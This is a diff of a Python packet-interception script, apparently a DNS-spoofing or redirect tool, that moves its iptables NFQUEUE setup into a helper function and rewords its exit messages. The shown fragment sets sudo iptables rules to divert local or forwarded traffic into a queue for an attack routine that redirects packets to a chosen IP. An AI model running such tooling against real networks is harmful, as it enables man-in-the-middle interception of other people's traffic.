@@ -45,7 +45,7 @@ def process_packet(packet):
     packet.accept()
 
 
-def start_attack(queue_num, queue_local_forward):
+def set_ip_tables(queue_num, queue_local_forward):
     if queue_local_forward == 'local' :
         subprocess.call(['sudo', 'iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_num])
         subprocess.call(['sudo', 'iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_num])
@@ -53,6 +53,14 @@ def start_attack(queue_num, queue_local_forward):
         subprocess.call(['sudo', 'iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_num])
     else:
         print('[-] Please specify if queue is local or forward!')
+        return False
+
+    return True
+
+
+def start_attack(queue_num, queue_local_forward):
+    if not set_ip_tables(queue_num, queue_local_forward):
+        print('[-] Iptables settings fails')
         return False
 
     queue = netfilterqueue.NetfilterQueue()
@@ -69,5 +77,6 @@ if __name__ == "__main__":
             REDIRECT_IP = options.redirect_ip
         start_attack(options.queue_n, options.queue)
     except KeyboardInterrupt:
+        print('\n[+] Detected CTRL + C, quitting...')
         subprocess.call(['sudo', 'iptables', '--flush'])
-        print('\n[+] Ending the attack')
+        print('[+] Attack ended!')
